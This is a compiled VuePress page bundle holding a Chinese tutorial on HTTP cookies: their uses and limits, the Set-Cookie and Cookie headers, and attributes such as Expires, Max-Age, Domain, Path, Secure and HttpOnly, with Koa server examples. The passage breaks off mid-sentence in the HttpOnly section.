(window.webpackJsonp=window.webpackJsonp||[]).push([[73],{261:function(t,e,s){t.exports=s.p+"assets/img/httponly.969a98a0.png"},366:function(t,e,s){"use strict";s.r(e);var a=s(1),n=Object(a.a)({},function(){var t=this,e=t.$createElement,a=t._self._c||e;return a("div",{staticClass:"content"},[a("p",[a("a",{attrs:{href:"https://www.wangdoc.com/javascript/bom/cookie.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("Cookie"),a("OutboundLink")],1)]),t._m(0),t._m(1),t._m(2),t._m(3),t._m(4),t._m(5),t._m(6),t._m(7),t._m(8),t._m(9),t._m(10),t._m(11),t._m(12),t._m(13),t._m(14),t._m(15),t._m(16),t._m(17),t._m(18),t._m(19),a("ul",[a("li",[t._v("HTTP 响应：Cookie 的生成："),a("router-link",{attrs:{to:"./4-cookie.html#_2-1-http-响应：cookie-的生成"}},[t._v("link")])],1),a("li",[t._v("HTTP 请求：Cookie 的发送："),a("router-link",{attrs:{to:"./4-cookie.html#_2-2-http-请求：cookie-的发送"}},[t._v("link")])],1)]),t._m(20),t._m(21),t._m(22),t._m(23),t._m(24),t._m(25),t._m(26),t._m(27),t._m(28),t._m(29),t._m(30),t._m(31),t._m(32),t._m(33),t._m(34),t._m(35),a("ul",[a("li",[t._v("Expires，Max-Age："),a("router-link",{attrs:{to:"./4-cookie.html#_3-1-expires，max-age"}},[t._v("link")])],1),a("li",[t._v("Domain，Path："),a("router-link",{attrs:{to:"./4-cookie.html#_3-2-domain，path"}},[t._v("link")])],1),a("li",[t._v("Secure，HttpOnly："),a("router-link",{attrs:{to:"./4-cookie.html#_3-3-secure，httponly"}},[t._v("link")])],1),a("li",[t._v("SameSite："),a("router-link",{attrs:{to:"./4-cookie.html#_3-4-samesite"}},[t._v("link")])],1)]),t._m(36),t._m(37),t._m(38),t._m(39),t._m(40),t._m(41),t._m(42),t._m(43),t._m(44),t._m(45),t._m(46),t._m(47),t._m(48),t._m(49),t._m(50),t._m(51),t._m(52),t._m(53),t._m(54),t._m(55),t._m(56),t._m(57),t._m(58),t._m(59),a("p",[a("enlarge",[a("img",{attrs:{src:s(261)}})])],1),t._m(60),t._m(61),t._m(62),t._m(63),t._m(64),t._m(65),t._m(66),t._m(67),t._m(68),t._m(69),t._m(70),t._m(71),t._m(72),t._m(73),t._m(74),t._m(75),t._m(76),t._m(77),t._m(78),t._m(79),t._m(80),t._m(81),t._m(82),t._m(83),t._m(84),t._m(85),t._m(86),t._m(87),t._m(88),t._m(89),t._m(90),t._m(91),t._m(92),t._m(93),a("p",[t._v("各个属性的写入注意点如下：")]),t._m(94),t._m(95),t._m(96),t._m(97),t._m(98),t._m(99),t._m(100),a("ul",[a("li",[a("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies",target:"_blank",rel:"noopener noreferrer"}},[t._v("HTTP cookies"),a("OutboundLink")],1),t._v(", by MDN")]),a("li",[a("a",{attrs:{href:"https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Using the Same-Site Cookie Attribute to Prevent CSRF Attacks"),a("OutboundLink")],1)]),t._m(101),a("li",[t._v("Tough Cookies, Scott Helme")]),a("li",[t._v("Cross-Site Request Forgery is dead!, Scott Helme")])])])},[function(){var t=this.$createElement,e=this._self._c||t;return e("h2",{attrs:{id:"_1、概述-♥"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_1、概述-♥","aria-hidden":"true"}},[this._v("#")]),this._v(" 1、概述 - ♥")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("Cookie")]),this._v(" 是服务器保存在浏览器的一小段文本信息，一般大小不能超过"),e("code",[this._v("4KB")]),this._v("。浏览器每次向服务器发出请求，就会自动附上这段信息。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"cookie不适合客户端存储"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#cookie不适合客户端存储","aria-hidden":"true"}},[this._v("#")]),this._v(" Cookie不适合客户端存储")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("Cookie")]),this._v(" 不是一种理想的客户端储存机制。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[t._v("它的容量很小（"),s("code",[t._v("4KB")]),t._v("），缺乏数据操作接口，而且会影响性能。")]),s("li",[t._v("客户端储存应该使用 "),s("code",[t._v("Web storage API")]),t._v(" 和 "),s("code",[t._v("IndexedDB")]),t._v("。")]),s("li",[s("strong",[t._v("只有那些每次请求都需要让服务器知道的信息，才应该放在 "),s("code",[t._v("Cookie")]),t._v(" 里面。")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"cookie主要用途"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#cookie主要用途","aria-hidden":"true"}},[this._v("#")]),this._v(" Cookie主要用途")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("Cookie")]),this._v("主要保存状态信息，以下是一些主要用途。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("ul",[e("li",[this._v("对话（"),e("code",[this._v("session")]),this._v("）管理：保存登录、购物车等需要记录的信息。")]),e("li",[this._v("个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。")]),e("li",[this._v("追踪用户：记录和分析用户行为，比如系统自动推送。")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"cookie的元数据"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#cookie的元数据","aria-hidden":"true"}},[this._v("#")]),this._v(" Cookie的元数据")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("每个 "),e("code",[this._v("Cookie")]),this._v(" 都有以下几方面的元数据。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("ul",[e("li",[e("code",[this._v("Cookie")]),this._v(" 的名字")]),e("li",[e("code",[this._v("Cookie")]),this._v(" 的值（真正的数据写在这里面）")]),e("li",[this._v("到期时间（超过这个时间会失效）")]),e("li",[this._v("所属域名（默认为当前域名）")]),e("li",[this._v("生效的路径（默认为当前网址）")])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[t._v("例如，用户访问网址"),s("code",[t._v("www.example.com")]),t._v("，服务器在浏览器写入一个 "),s("code",[t._v("Cookie")]),t._v("。这个"),s("code",[t._v("Cookie")]),t._v(" 的所属域名为"),s("code",[t._v("www.example.com")]),t._v("，生效路径为根路径"),s("code",[t._v("/")]),t._v("。如果 "),s("code",[t._v("Cookie")]),t._v(" 的生效路径设为"),s("code",[t._v("/forums")]),t._v("，那么这个 "),s("code",[t._v("Cookie")]),t._v(" 只有在访问"),s("code",[t._v("www.example.com/forums")]),t._v("及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 "),s("code",[t._v("Cookie")]),t._v("，一起发送给服务器。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"cookieenabled属性、document-cookie属性"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#cookieenabled属性、document-cookie属性","aria-hidden":"true"}},[this._v("#")]),this._v(" cookieEnabled属性、document.cookie属性")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[t._v("用户可以设置浏览器不接受 "),s("code",[t._v("Cookie")]),t._v("，也可以设置不向服务器发送 "),s("code",[t._v("Cookie")]),t._v("。"),s("code",[t._v("window.navigator.cookieEnabled")]),t._v("属性返回一个布尔值，表示浏览器是否打开"),s("code",[t._v("Cookie")]),t._v(" 功能。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[t._v("window"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("navigator"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookieEnabled "),s("span",{attrs:{class:"token comment"}},[t._v("// true")]),t._v("\n\n"),s("span",{attrs:{class:"token comment"}},[t._v("// 获取当前网页的 Cookie")]),t._v("\ndocument"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),s("span",{attrs:{class:"token comment"}},[t._v('// "id=foo;key=bar"')]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"使用cookie注意事项"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#使用cookie注意事项","aria-hidden":"true"}},[this._v("#")]),this._v(" 使用Cookie注意事项")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("不同浏览器对 "),e("code",[this._v("Cookie")]),this._v(" 数量和大小的限制，是不一样的。一般来说，")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[t._v("单个域名设置的 "),s("code",[t._v("Cookie")]),t._v(" 不应超过"),s("code",[t._v("30")]),t._v("个，")]),s("li",[t._v("每个 "),s("code",[t._v("Cookie")]),t._v(" 的大小不能超过"),s("code",[t._v("4KB")]),t._v("。")]),s("li",[t._v("超过限制以后，"),s("code",[t._v("Cookie")]),t._v(" 将被忽略，不会被设置。")])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[t._v("浏览器的同源政策规定，两个网址只要域名相同，就可以共享 "),s("code",[t._v("Cookie")]),t._v("。注意，这里不要求协议相同。也就是说，"),s("code",[t._v("http://example.com")]),t._v("设置的 "),s("code",[t._v("Cookie")]),t._v("，可以被"),s("code",[t._v("https://example.com")]),t._v("读取。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h2",{attrs:{id:"_2、cookie-与-http-协议-♥"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_2、cookie-与-http-协议-♥","aria-hidden":"true"}},[this._v("#")]),this._v(" 2、Cookie 与 HTTP 协议 - ♥")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("Cookie")]),this._v(" 由 "),e("code",[this._v("HTTP")]),this._v(" 协议生成，主要供 "),e("code",[this._v("HTTP")]),this._v(" 协议使用。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_2-1-http-响应：cookie-的生成"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_2-1-http-响应：cookie-的生成","aria-hidden":"true"}},[this._v("#")]),this._v(" 2.1 HTTP 响应：Cookie 的生成")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("服务器如果希望在浏览器保存 "),e("code",[this._v("Cookie")]),this._v("，就要在 "),e("code",[this._v("HTTP")]),this._v(" 响应的头信息里面，放置一个"),e("code",[this._v("Set-Cookie")]),this._v("字段。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("div",{staticClass:"language-js extra-class"},[e("pre",{pre:!0,attrs:{class:"language-js"}},[e("code",[e("span",{attrs:{class:"token comment"}},[this._v("// 响应头 - 浏览器保存一个名为foo的 Cookie，它的值为bar")]),this._v("\n"),e("span",{attrs:{class:"token template-string"}},[e("span",{attrs:{class:"token string"}},[this._v("`Set-Cookie: foo=bar`")])]),this._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("一个"),e("code",[this._v("Set-Cookie")]),this._v("字段里面，可以同时包括多个属性，没有次序的要求。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h4",{attrs:{id:"修改cookie"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#修改cookie","aria-hidden":"true"}},[this._v("#")]),this._v(" 修改cookie")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("如果服务器想改变一个早先设置的 "),e("code",[this._v("Cookie")]),this._v("，必须同时满足四个条件："),e("code",[this._v("Cookie")]),this._v(" 的")])},function(){var t=this.$createElement,e=this._self._c||t;return e("ul",[e("li",[e("code",[this._v("key")])]),e("li",[e("code",[this._v("domain")])]),e("li",[e("code",[this._v("path")])]),e("li",[e("code",[this._v("secure")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("只要有一个属性不同，就会生成一个全新的 "),e("code",[this._v("Cookie")]),this._v("，而非替换掉"),e("code",[this._v("Cookie")]),this._v("。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// 原始的 `Cookie` 是用如下的`Set-Cookie`设置。")]),t._v("\n"),s("span",{attrs:{class:"token string"}},[t._v("'Set-Cookie: key1=value1; domain=example.com; path=/blog'")]),t._v("\n\n"),s("span",{attrs:{class:"token comment"}},[t._v("// 改变上面这个 Cookie 的值，就必须使用同样的Set-Cookie。")]),t._v("\n"),s("span",{attrs:{class:"token string"}},[t._v("'Set-Cookie: key1=value2; domain=example.com; path=/blog'")]),t._v("\n\n"),s("span",{attrs:{class:"token comment"}},[t._v("// 下面设置了一个全新的同名 Cookie，但是path属性不一样")]),t._v("\n"),s("span",{attrs:{class:"token comment"}},[t._v("// 下一次访问example.com/blog的时候，浏览器将向服务器发送两个同名的 Cookie。")]),t._v("\n"),s("span",{attrs:{class:"token string"}},[t._v("'Set-Cookie: key1=value2; domain=example.com; path=/'")]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_2-2-http-请求：cookie-的发送"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_2-2-http-请求：cookie-的发送","aria-hidden":"true"}},[this._v("#")]),this._v(" 2.2 HTTP 请求：Cookie 的发送")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[t._v("浏览器向服务器发送 "),s("code",[t._v("HTTP")]),t._v(" 请求时，每个请求都会带上相应的 "),s("code",[t._v("Cookie")]),t._v("。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 "),s("code",[t._v("HTTP")]),t._v(" 头信息的"),s("code",[t._v("Cookie")]),t._v("字段。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// 请求头 - 向服务器发送名为foo的 Cookie，值为bar")]),t._v("\n"),s("span",{attrs:{class:"token template-string"}},[s("span",{attrs:{class:"token string"}},[t._v("`Cookie: foo=bar`")])]),t._v("\n\n"),s("span",{attrs:{class:"token comment"}},[t._v("// Cookie字段可以包含多个 Cookie，使用分号（;）分隔。")]),t._v("\n"),s("span",{attrs:{class:"token string"}},[t._v("'Cookie: name=value; name2=value2; name3=value3'")]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("服务器收到浏览器发来的 "),e("code",[this._v("Cookie")]),this._v(" 时，有两点是无法知道的。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("ul",[e("li",[e("code",[this._v("Cookie")]),this._v(" 的各种属性，比如何时过期。")]),e("li",[this._v("哪个域名设置的 "),e("code",[this._v("Cookie")]),this._v("，到底是一级域名设的，还是某一个二级域名设的。")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h2",{attrs:{id:"_3、cookie-的属性-♥"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_3、cookie-的属性-♥","aria-hidden":"true"}},[this._v("#")]),this._v(" 3、Cookie 的属性 - ♥")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_3-1-expires，max-age"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_3-1-expires，max-age","aria-hidden":"true"}},[this._v("#")]),this._v(" 3.1 Expires，Max-Age")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h4",{attrs:{id:"expires-cookie到期时间"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#expires-cookie到期时间","aria-hidden":"true"}},[this._v("#")]),this._v(" Expires - Cookie到期时间")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[s("code",[t._v("Expires")]),t._v("属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 "),s("code",[t._v("Cookie")]),t._v("。它的值是 "),s("code",[t._v("UTC")]),t._v(" （"),s("code",[t._v("Universal Time Coordinated")]),t._v("，世界协调时间）格式，可以使用"),s("code",[t._v("Date.prototype.toUTCString()")]),t._v("进行格式转换。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// koa")]),t._v("\nrouter"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token keyword"}},[t._v("get")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'/detail'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{attrs:{class:"token keyword"}},[t._v("async")]),t._v(" ctx "),s("span",{attrs:{class:"token operator"}},[t._v("=>")]),t._v(" "),s("span",{attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  ctx"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token keyword"}},[t._v("set")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'Set-Cookie'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{attrs:{class:"token template-string"}},[s("span",{attrs:{class:"token string"}},[t._v("`name=zy;Expires=Wed, 16 Apri 2021 17:00:00 GMT`")])]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  "),s("span",{attrs:{class:"token keyword"}},[t._v("await")]),t._v(" ctx"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("render")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'detail'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[t._v("不设置"),s("code",[t._v("Expires")]),t._v("该属性，或者设为"),s("code",[t._v("null")]),t._v("，"),s("code",[t._v("Cookie")]),t._v(" 只在当前会话（"),s("code",[t._v("session")]),t._v("）有效，浏览器窗口一旦关闭，当前 "),s("code",[t._v("Session")]),t._v(" 结束，该 "),s("code",[t._v("Cookie")]),t._v(" 就会被删除。")]),s("li",[t._v("浏览器根据本地时间，决定 "),s("code",[t._v("Cookie")]),t._v(" 是否过期，由于本地时间是不精确的，所以没有办法保证 "),s("code",[t._v("Cookie")]),t._v(" 一定会在服务器指定的时间过期。")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h4",{attrs:{id:"max-age-cookie有效时长"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#max-age-cookie有效时长","aria-hidden":"true"}},[this._v("#")]),this._v(" Max-Age - Cookie有效时长")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[s("code",[t._v("Max-Age")]),t._v("属性指定从现在开始 "),s("code",[t._v("Cookie")]),t._v(" 存在的秒数，比如"),s("code",[t._v("60 * 60 * 24 * 365")]),t._v("（即一年）。过了这个时间以后，浏览器就不再保留这个 "),s("code",[t._v("Cookie")]),t._v("。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[t._v("如果同时指定了"),s("code",[t._v("Expires")]),t._v("和"),s("code",[t._v("Max-Age")]),t._v("，那么"),s("code",[t._v("Max-Age")]),t._v("的值将优先生效。")]),s("li",[t._v("如果"),s("code",[t._v("Set-Cookie")]),t._v("字段没有指定"),s("code",[t._v("Expires")]),t._v("或"),s("code",[t._v("Max-Age")]),t._v("属性，那么这个 "),s("code",[t._v("Cookie")]),t._v(" 就是 "),s("code",[t._v("Session Cookie")]),t._v("，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 "),s("code",[t._v("Cookie")]),t._v("。")])])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{attrs:{class:"token comment"}},[t._v("// koa")]),t._v("\nrouter"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token keyword"}},[t._v("get")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'/detail'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{attrs:{class:"token keyword"}},[t._v("async")]),t._v(" ctx "),s("span",{attrs:{class:"token operator"}},[t._v("=>")]),t._v(" "),s("span",{attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  ctx"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token keyword"}},[t._v("set")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'Set-Cookie'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),s("span",{attrs:{class:"token template-string"}},[s("span",{attrs:{class:"token string"}},[t._v("`name=zy;Max-Age=")]),s("span",{attrs:{class:"token interpolation"}},[s("span",{attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("${")]),s("span",{attrs:{class:"token number"}},[t._v("60")]),t._v(" "),s("span",{attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),s("span",{attrs:{class:"token number"}},[t._v("60")]),t._v(" "),s("span",{attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),s("span",{attrs:{class:"token number"}},[t._v("24")]),t._v(" "),s("span",{attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),s("span",{attrs:{class:"token number"}},[t._v("365")]),s("span",{attrs:{class:"token interpolation-punctuation punctuation"}},[t._v("}")])]),s("span",{attrs:{class:"token string"}},[t._v("`")])]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  "),s("span",{attrs:{class:"token keyword"}},[t._v("await")]),t._v(" ctx"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("render")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'detail'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_3-2-domain，path"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_3-2-domain，path","aria-hidden":"true"}},[this._v("#")]),this._v(" 3.2 Domain，Path")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h4",{attrs:{id:"domain"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#domain","aria-hidden":"true"}},[this._v("#")]),this._v(" Domain")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[s("code",[t._v("Domain")]),t._v("属性指定浏览器发出 "),s("code",[t._v("HTTP")]),t._v(" 请求时，哪些域名要附带这个 "),s("code",[t._v("Cookie")]),t._v("。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 "),s("code",[t._v("Cookie")]),t._v("。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[t._v("比如，"),s("code",[t._v("example.com")]),t._v("不设置 "),s("code",[t._v("Cookie")]),t._v(" 的"),s("code",[t._v("domain")]),t._v("属性，那么"),s("code",[t._v("sub.example.com")]),t._v("将不会附带这个 "),s("code",[t._v("Cookie")]),t._v("。如果指定了"),s("code",[t._v("domain")]),t._v("属性，那么子域名也会附带这个 "),s("code",[t._v("Cookie")]),t._v("。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 "),e("code",[this._v("Cookie")]),this._v("。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h4",{attrs:{id:"path"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#path","aria-hidden":"true"}},[this._v("#")]),this._v(" Path")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[s("code",[t._v("Path")]),t._v("属性指定浏览器发出 "),s("code",[t._v("HTTP")]),t._v(" 请求时，哪些路径要附带这个 "),s("code",[t._v("Cookie")]),t._v("。只要浏览器发现，"),s("code",[t._v("Path")]),t._v("属性是 "),s("code",[t._v("HTTP")]),t._v(" 请求路径的开头一部分，就会在头信息里面带上这个 "),s("code",[t._v("Cookie")]),t._v("。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[t._v("比如，"),s("code",[t._v("path")]),t._v("属性是"),s("code",[t._v("/")]),t._v("，那么请求"),s("code",[t._v("/docs")]),t._v("路径也会包含该 "),s("code",[t._v("Cookie")]),t._v("。当然，前提是域名必须一致。")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h3",{attrs:{id:"_3-3-secure，httponly"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_3-3-secure，httponly","aria-hidden":"true"}},[this._v("#")]),this._v(" 3.3 Secure，HttpOnly")])},function(){var t=this.$createElement,e=this._self._c||t;return e("h4",{attrs:{id:"secure"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#secure","aria-hidden":"true"}},[this._v("#")]),this._v(" Secure")])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[e("code",[this._v("Secure")]),this._v("属性指定浏览器只有在加密协议 "),e("code",[this._v("HTTPS")]),this._v(" 下，才能将这个 "),e("code",[this._v("Cookie")]),this._v(" 发送到服务器。该属性只是一个开关，不需要指定值。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("ul",[s("li",[t._v("如果当前协议是 "),s("code",[t._v("HTTP")]),t._v("，浏览器会自动忽略服务器发来的"),s("code",[t._v("Secure")]),t._v("属性。")]),s("li",[t._v("如果通信是 "),s("code",[t._v("HTTPS")]),t._v(" 协议，该开关自动打开。")])])},function(){var t=this.$createElement,e=this._self._c||t;return e("h4",{attrs:{id:"httponly"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#httponly","aria-hidden":"true"}},[this._v("#")]),this._v(" HttpOnly")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("p",[s("code",[t._v("HttpOnly")]),t._v("属性指定该 "),s("code",[t._v("Cookie")]),t._v(" 无法通过 "),s("code",[t._v("JavaScript")]),t._v(" 脚本拿到，主要是"),s("code",[t._v("document.cookie")]),t._v("属性、"),s("code",[t._v("XMLHttpRequest")]),t._v("对象和 "),s("code",[t._v("Request API")]),t._v(" 都拿不到该属性。这样就防止了该 "),s("code",[t._v("Cookie")]),t._v(" 被脚本读到，只有浏览器发出 "),s("code",[t._v("HTTP")]),t._v(" 请求时，才会带上该 "),s("code",[t._v("Cookie")]),t._v("。")])},function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[t._v("router"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token keyword"}},[t._v("get")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'/detail'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{attrs:{class:"token keyword"}},[t._v("async")]),t._v(" ctx "),s("span",{attrs:{class:"token operator"}},[t._v("=>")]),t._v(" "),s("span",{attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  "),s("span",{attrs:{class:"token comment"}},[t._v("// ctx.set('Set-Cookie', 'key1=666; Max-Age=3600;path=/')")]),t._v("\n  ctx"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token keyword"}},[t._v("set")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'Set-Cookie'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'key1=888; path=/detail;'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n  ctx"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token keyword"}},[t._v("set")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'Set-Cookie'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),s("span",{attrs:{class:"token string"}},[t._v("'key1=888; path=/detail;HttpOnly'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),s("span",{attrs:{class:"token comment"}},[t._v("// 无法通过脚本拿到")]),t._v("\n  "),s("span",{attrs:{class:"token keyword"}},[t._v("await")]),t._v(" ctx"),s("span",{attrs:{class:"token punctuation"}},[t._v(".")]),s("span",{attrs:{class:"token function"}},[t._v("render")]),s("span",{attrs:{class:"token punctuation"}},[t._v("(")]),s("span",{attrs:{class:"token string"}},[t._v("'detail'")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),s("span",{attrs:{class:"token punctuation"}},[t._v("}")]),s("span",{attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])])])},function(){var t=this.$createElement,e=this._self._c||t;return e("p",[this._v("如果设置了一个 "),e("code",[this._v("Cookie")]),this._v(" 的"),e("code",[this._v("HttpOnly")]),this._v("属性，下面代码就不会读到该 